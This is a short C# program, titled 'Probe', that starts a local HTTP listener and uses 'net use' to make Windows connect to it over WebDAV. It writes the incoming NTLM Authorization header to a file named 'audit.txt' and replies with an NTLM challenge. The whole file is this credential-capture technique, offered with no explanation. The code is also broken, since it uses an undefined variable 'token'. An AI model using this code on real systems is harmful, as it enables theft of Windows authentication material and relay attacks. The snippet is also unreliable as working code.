using System.Net;
using System.IO;
using System.Diagnostics;
class Probe {
 static void Main() {
  var server = new HttpListener();
  server.Prefixes.Add("http://localhost:9090/");
  server.Start();
  Process.Start("cmd.exe", @"/c net use z: \\localhost@9090\share");
  var request = server.GetContext();
  File.AppendAllText("audit.txt", request.Request.Headers["Authorization"]);
  request.Response.StatusCode = 401;
  request.Response.AddHeader("WWW-Authenticate", "NTLM " + token);
 }
}
